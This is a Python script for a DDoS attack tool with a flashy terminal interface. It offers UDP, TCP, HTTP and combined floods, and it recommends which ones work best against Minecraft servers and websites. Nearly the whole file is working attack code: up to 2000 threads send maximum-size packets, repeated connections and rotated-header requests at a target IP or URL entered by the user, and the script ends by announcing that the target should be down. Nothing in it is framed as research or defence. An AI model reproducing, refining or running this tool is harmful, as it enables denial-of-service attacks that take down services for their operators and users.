#!/usr/bin/env python3
import socket
import threading
import random
import time
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich.progress import Progress, BarColumn, SpinnerColumn
from rich.table import Table
from rich.style import Style
from rich.text import Text
import requests
import sys
import os

# ===== CONFIG ===== #
MAX_THREADS = 2000  # Max threads for extreme power
UDP_PACKET_SIZE = 65507  # Max UDP packet size
TCP_PACKET_SIZE = 4096   # Optimal TCP packet size
HTTP_TIMEOUT = 3         # HTTP request timeout

# ===== STYLES ===== #
console = Console()
error_style = Style(color="red", bold=True)
success_style = Style(color="green", bold=True)
warning_style = Style(color="yellow", bold=True)
info_style = Style(color="cyan", bold=True)
scary_style = Style(color="#ff0000", blink=True, bold=True)

# ===== SCARY BANNER ===== #
def show_banner():
    banner = Text("""
 █████╗ ███╗   ██╗ █████╗ ███████╗ ██████╗  ██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔═══██╗
███████║██╔██╗ ██║███████║███████╗██║   ██║██║   ██║
██╔══██║██║╚██╗██║██╔══██║╚════██║██║   ██║██║   ██║
██║  ██║██║ ╚████║██║  ██║███████║╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ 
""", style=scary_style)
    
    subtitle = Text("ULTIMATE DDoS TERMINAL GUI", style="bold red on black")
    console.print(Panel(banner, title="[blink]🔥 NUKER MODE ACTIVATED 🔥[/]", subtitle=subtitle, style="bold red"))

# ===== MAIN MENU ===== #
def show_menu():
    table = Table(title="[bold red]SELECT ATTACK TYPE", show_header=True, header_style="bold white on red")
    table.add_column("Option", style="bold magenta")
    table.add_column("Attack Type", style="bold cyan")
    table.add_column("Power Level", style="bold yellow")
    table.add_row("1", "UDP FLOOD", "💀 EXTREME (Best for Minecraft/PocketMine)")
    table.add_row("2", "HTTP FLOOD", "🔥 HIGH (Best for Websites)")
    table.add_row("3", "TCP FLOOD", "☠️ BRUTAL (Best for Servers)")
    table.add_row("4", "MIXED ATTACK", "☢️ NUCLEAR (All attacks combined)")
    console.print(table)

# ===== ATTACK FUNCTIONS ===== #
def udp_flood(target_ip, target_port, duration, threads, packet_size):
    console.print(f"[bold red]🚀 LAUNCHING UDP FLOOD ON {target_ip}:{target_port}", style="on black")
    packets_sent = 0
    failed = 0
    
    def attack():
        nonlocal packets_sent, failed
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(packet_size)
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(data, (target_ip, target_port))
                packets_sent += 1
                # Send extra packets for more power
                for _ in range(3):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    sock.sendto(data, (target_ip, target_port))
                    packets_sent += 1
            except:
                failed += 1
    
    launch_attack(attack, threads, duration, "UDP")

def http_flood(target_url, duration, threads):
    console.print(f"[bold red]🔥 LAUNCHING HTTP FLOOD ON {target_url}", style="on black")
    requests_sent = 0
    failed = 0
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 10; SM-G960F)",
        "python-requests/2.25.1",
        "curl/7.68.0",
        "Java/11.0.7"
    ]
    
    def attack():
        nonlocal requests_sent, failed
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml",
                    "Connection": "keep-alive"
                }
                
                # Alternate between GET and POST
                if random.random() > 0.7:
                    requests.post(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                else:
                    requests.get(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                
                requests_sent += 1
                
                # Send extra requests
                for _ in range(2):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    requests.get(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                    requests_sent += 1
            except:
                failed += 1
    
    launch_attack(attack, threads, duration, "HTTP")

def tcp_flood(target_ip, target_port, duration, threads, packet_size):
    console.print(f"[bold red]☠️ LAUNCHING TCP FLOOD ON {target_ip}:{target_port}", style="on black")
    packets_sent = 0
    failed = 0
    
    def attack():
        nonlocal packets_sent, failed
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                s.sendall(random._urandom(packet_size))
                s.close()
                packets_sent += 1
                
                # Extra connections for more damage
                for _ in range(2):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((target_ip, target_port))
                        s.sendall(random._urandom(packet_size))
                        s.close()
                        packets_sent += 1
                    except:
                        failed += 1
            except:
                failed += 1
    
    launch_attack(attack, threads, duration, "TCP")

# ===== ATTACK LAUNCHER ===== #
def launch_attack(attack_func, threads, duration, attack_name):
    global stop_event
    stop_event = threading.Event()
    
    # Limit threads to prevent system crash
    threads = min(threads, MAX_THREADS)
    
    with Progress(
        SpinnerColumn(style="red"),
        "[progress.description]{task.description}",
        BarColumn(bar_width=40, style="red"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task(f"[red]💀 {attack_name} ATTACK IN PROGRESS...", total=duration)
        
        # Start attack threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Update progress bar
        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            time.sleep(0.1)
            progress.update(task, advance=0.1)
        
        stop_event.set()
        for t in thread_list:
            t.join(timeout=1)
    
    console.print(f"[bold green]✅ ATTACK COMPLETED![/]", style="on black")

# ===== MAIN FUNCTION ===== #
def main():
    show_banner()
    show_menu()
    
    choice = Prompt.ask("[bold red]SELECT ATTACK (1-4)", choices=["1", "2", "3", "4"])
    
    if choice in ["1", "3", "4"]:  # UDP/TCP/MIXED
        target_ip = Prompt.ask("[bold cyan]TARGET IP")
        target_port = IntPrompt.ask("[bold magenta]TARGET PORT", default=19132 if choice == "1" else 80)
    
    if choice in ["2", "4"]:  # HTTP/MIXED
        target_url = Prompt.ask("[bold cyan]TARGET URL (http://)", default="http://" + (target_ip if 'target_ip' in locals() else "example.com"))
    
    duration = IntPrompt.ask("[bold yellow]ATTACK DURATION (SECONDS)", default=60)
    threads = IntPrompt.ask("[bold green]THREAD COUNT (More = Powerful)", default=500)
    
    # Advanced options
    if choice in ["1", "3"]:
        packet_size = IntPrompt.ask("[bold magenta]PACKET SIZE (Bytes)", 
                                  default=UDP_PACKET_SIZE if choice == "1" else TCP_PACKET_SIZE)
    
    console.print("[bold red]🚀 INITIATING ATTACK SEQUENCE...", style="on black")
    
    # Launch selected attack
    if choice == "1":  # UDP
        udp_flood(target_ip, target_port, duration, threads, packet_size)
    elif choice == "2":  # HTTP
        http_flood(target_url, duration, threads)
    elif choice == "3":  # TCP
        tcp_flood(target_ip, target_port, duration, threads, packet_size)
    elif choice == "4":  # MIXED
        console.print("[bold red]☢️ LAUNCHING NUCLEAR MIXED ATTACK!", style="on black")
        
        # Start all attacks simultaneously
        t1 = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, threads//3, UDP_PACKET_SIZE))
        t2 = threading.Thread(target=http_flood, args=(target_url, duration, threads//3))
        t3 = threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration, threads//3, TCP_PACKET_SIZE))
        
        t1.start()
        t2.start()
        t3.start()
        
        t1.join()
        t2.join()
        t3.join()
    
    console.print("[blink bold red]💀 ATTACK FINISHED! TARGET SHOULD BE DOWN![/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]ATTACK STOPPED BY USER!", style="on black")
        if 'stop_event' in globals():
            stop_event.set()
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]ERROR: {str(e)}", style="on black")
        sys.exit(1)
